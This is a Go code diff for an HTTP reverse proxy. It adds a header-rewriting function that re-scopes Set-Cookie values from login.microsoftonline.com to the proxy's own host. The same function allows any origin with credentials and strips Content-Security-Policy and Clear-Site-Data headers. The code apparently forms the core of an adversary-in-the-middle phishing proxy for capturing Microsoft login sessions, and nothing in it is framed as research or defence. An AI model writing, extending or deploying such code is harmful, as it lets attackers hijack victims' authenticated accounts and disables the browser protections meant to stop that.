@@ -4,6 +4,7 @@ import (
     "io/ioutil"
     "net/http"
     "os"
+    "strings"
 )
 
 const (
@@ -51,15 +52,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     body, _ := ioutil.ReadAll(resp.Body)
 
     // Handle response headers and CORS
-    for key, values := range resp.Header {
-        for _, value := range values {
-            w.Header().Add(key, value)
-        }
-    }
-
-    // Add CORS headers
-    w.Header().Set("Access-Control-Allow-Origin", "*")
-    w.Header().Set("Access-Control-Allow-Credentials", "true")
+    modifyHeadersForCORS(resp.Header, w.Header(), r.Host)
 
     w.WriteHeader(resp.StatusCode)
     w.Write(body)
@@ -71,6 +64,28 @@ func handlePreflight(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
     w.Header().Set("Access-Control-Allow-Credentials", "true")
     w.WriteHeader(http.StatusOK)
+}
+
+func modifyHeadersForCORS(src http.Header, dst http.Header, host string) {
+    for key, values := range src {
+        for _, value := range values {
+            if key == "Set-Cookie" {
+                // Replace domain in cookies
+                value = strings.Replace(value, "login.microsoftonline.com", host, -1)
+                dst.Add(key, value)
+            } else {
+                dst.Add(key, value)
+            }
+        }
+    }
+    // Add CORS headers
+    dst.Set("Access-Control-Allow-Origin", "*")
+    dst.Set("Access-Control-Allow-Credentials", "true")
+
+    // Remove restrictive headers
+    dst.Del("Content-Security-Policy")
+    dst.Del("Content-Security-Policy-Report-Only")
+    dst.Del("Clear-Site-Data")
 }
 
 func copyHeaders(src http.Header, dst http.Header) {
